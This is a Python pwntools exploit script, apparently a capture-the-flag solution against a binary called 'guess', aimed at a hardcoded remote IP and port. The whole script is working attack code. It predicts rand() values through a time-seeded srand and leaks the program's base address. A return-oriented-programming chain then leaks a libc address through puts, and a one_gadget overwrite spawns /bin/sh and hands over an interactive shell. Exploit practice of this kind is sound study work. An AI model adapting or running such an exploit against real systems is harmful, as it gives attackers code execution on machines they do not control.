from pwn import *
from ctypes import cdll
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc.so.6')
elf = ELF('./guess')
libc_rand = cdll.LoadLibrary("./libc.so.6")

context.log_level = 'debug'
debug = 0

if debug:
    io = process('./guess')
    libc_rand.srand(libc_rand.time(0))
else:
    io = remote('123.127.164.29',28031)
    libc_rand.srand(libc_rand.time(0))

def p():
    gdb.attach(proc.pidof(io)[0])

'''
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

one_gadget = [0x4f2a5,0x4f302,0x10a2fc]

vsvsyscall = 0xffffffffff600400
io.recvuntil('Enter the size :')
#p()
io.sendline(b'100')

io.recvuntil(b'Enter the number of tries :')
io.sendline(b'1')
# for i in range(10):
io.recvuntil(b'Enter your guess :')
num = libc_rand.rand()
#p()
io.sendline(str(b'a').encode())

# codebase
io.recvuntil(b'You entered ')
code_base = io.recvuntil(b' ',drop=True)
code_base = int(code_base.decode(),10) - 0x1579
success("code_base -->" + hex(code_base))
#p()

rdi_ret = code_base + 0x0000000000001793 # pop rdi ; ret
rsi_r15_ret = code_base + 0x0000000000001791 # pop rsi ; pop r15 ; ret
puts_got = code_base + elf.got['puts']
puts_plt = code_base + elf.plt['puts']
ret_addr = code_base + 0x143a

io.recvuntil(b'But maybe a threaded win can help?')
#payload = p64(vsvsyscall) * (0x1ce- 1) + b'\xe5\x76'
payload = b'\x00' * 8 * 5
payload += p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(ret_addr)
payload = payload.ljust(0x860, b'\x00')
#p()
io.sendline(payload)
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x80970
success("libc_base -->" + hex(libc_base))
payload = b'\x00'* 0x28 + p64(one_gadget[0] + libc_base)
io.sendafter(b'>', payload)


io.interactive()

